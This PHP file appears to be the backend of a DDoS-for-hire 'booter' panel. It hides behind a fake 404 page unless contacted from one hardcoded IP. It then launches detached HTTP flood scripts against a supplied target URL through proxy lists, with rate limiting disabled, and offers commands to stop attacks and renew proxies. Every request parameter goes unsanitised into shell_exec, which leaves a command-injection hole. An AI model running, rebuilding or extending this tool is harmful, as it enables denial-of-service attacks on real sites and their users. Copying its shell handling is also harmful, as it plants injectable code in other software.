<?php
error_reporting(0);
$target = $_GET['target'];
$time = $_GET['time'];
$key = $_GET['key'];
$method = $_GET['method'];
$data = $_GET['postdata'];
$httpversion = $_GET['httpversion'];
$rqps = $_GET['rqps'];
$country = $_GET['country'];
$cookie = $_GET['cookie'];
$concurent = $_GET['concurent'];

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {

    $ip = $_SERVER['HTTP_CLIENT_IP'];

} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {

    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];

} else {

    $ip = $_SERVER['REMOTE_ADDR'];

}

$serverip = $_SERVER['SERVER_ADDR'];

if($ip !== '194.9.172.114') {

    echo "
    <html><head>
    <title>404 Not Found</title>
    </head><body>
    <h1>Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    <address>Apache/2.4.41 (Ubuntu) Server at $serverip Port 80</address>
    </body></html>
    ";

}else {

    switch($method) {

        case 'HTTP-GET': $output = shell_exec("cd methods; screen -dmS $key node index.js $target --duration $time --threads $concurent --method GET --body null --ratelimit deactivate --cookie false");
            echo "<center><body><pre>";
            echo "URL: <strong>$target</strong>\n";
            echo "TIME: <strong>$time</strong>\n";
            echo "CONCURENT: <strong>$concurent</strong>\n"; 
        break;

        case 'HTTP-DATA': $output = shell_exec("cd methods; screen -dmS $key node index.js $target --duration $time --threads $concurent --method GET --body $data --ratelimit deactivate --cookie false");
            echo "<center><body><pre>";
            echo "URL: <strong>$target</strong>\n";
            echo "TIME: <strong>$time</strong>\n";
            echo "CONCURENT: <strong>$concurent</strong>\n"; 
        break;

        case 'HTTP-COOKIE': $output = shell_exec("cd methods; screen -dmS $key node index.js $target --duration $time --threads $concurent --method GET --body null --ratelimit deactivate --cookie $cookie");
            echo "<center><body><pre>";
            echo "URL: <strong>$target</strong>\n";
            echo "TIME: <strong>$time</strong>\n";
            echo "CONCURENT: <strong>$concurent</strong>\n"; 
        break;

        case 'HTTP-POSTCOOKIE': $output = shell_exec("cd methods; screen -dmS $key node index.js $target --duration $time --threads $concurent --method GET --body $data --ratelimit deactivate --cookie $cookie");
            echo "<center><body><pre>";
            echo "URL: <strong>$target</strong>\n";
            echo "TIME: <strong>$time</strong>\n";
            echo "CONCURENT: <strong>$concurent</strong>\n";
        break;

        case 'bps': $output = shell_exec("cd methods; screen -dmS $key node otters.js $target $time $concurent GET $httpversion referer.txt ua.txt proxys.txt");
            echo "<center><body><pre>";
            echo "URL: <strong>$target</strong>\n";
            echo "TIME: <strong>$time</strong>\n";
            echo "CONCURENT: <strong>$concurent</strong>\n";
        break;

        case 'otterv2': $output = shell_exec("cd methods; screen -dmS $key node http2.js $target $time $concurent proxys.txt");
            echo "<center><body><pre>";
            echo "URL: <strong>$target</strong>\n";
            echo "TIME: <strong>$time</strong>\n";
            echo "CONCURENT: <strong>$concurent</strong>\n";
        break;

        case 'httpacid': $output = shell_exec("cd methods; screen -dmS $key node browser.js $target $time 3 $httpversion 50000 64 proxys.txt");
            echo "<center><body><pre>";
            echo "URL: <strong>$target</strong>\n";
            echo "TIME: <strong>$time</strong>\n";
            echo "BROWSER: <strong>12</strong>\n";
        break;

        case 'httpbrowser': $output = shell_exec("cd methods/methods; screen -dmS $key node main.js $target $time $rqps auto $httpversion $country 60000 3 proxys.txt");
            echo "<center><body><pre>";
            echo "URL: <strong>$target</strong>\n";
            echo "TIME: <strong>$time</strong>\n";
        break;

        case 'stop': $output = shell_exec("pkill -f $key");
            echo "<center><body><pre>";
            echo "your attack as been stopped";
        break;

        case 'renewproxy': $output = shell_exec("cd methods; sh scraper.sh");
            echo "<center><body><pre>proxy was started</center></body></pre>";
        break;

        case 'stopall': $output = shell_exec("pkill node -9");
            echo "<center><body><pre>";
            echo "you stop all attack";
        break;

    }    

}

?>
